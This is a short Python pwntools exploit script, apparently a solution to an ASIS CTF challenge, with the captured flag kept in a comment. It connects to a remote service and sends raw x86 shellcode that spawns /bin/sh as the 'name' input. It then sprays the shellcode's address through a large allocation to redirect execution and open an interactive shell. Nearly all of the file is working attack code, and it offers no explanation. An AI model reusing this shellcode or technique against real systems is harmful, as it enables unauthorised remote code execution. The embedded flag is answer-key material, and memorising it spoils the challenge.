#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

# ASIS{732f9beb138dbca4e44d5d184c3074dc}
host = "10.211.55.28"
port = 8888
host = "shadow.asis-ctf.ir"
port = 31337

def add_one(content):
    r.sendline("1")
#    r.recvuntil("length?")
    r.sendline(str(len(content)))
    r.sendline(content)

def magic(count):
    r.sendline("2")
    r.sendline("0")
    r.recvuntil("yes:")
    for i in range(count):
        print i
        r.sendline("a")
    r.sendline("y")
    r.sendline(p32(0x804a520)*0x4000)
    r.interactive()

scaddr = 0x804a520
r = remote(host,port)
r.recvuntil("name?")
r.sendline("\x90\x90\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x08\x40\x40\x40\xcd\x80")
r.recvuntil("it?")
add_one("a"*0x21000)
magic(80000)

r.interactive()
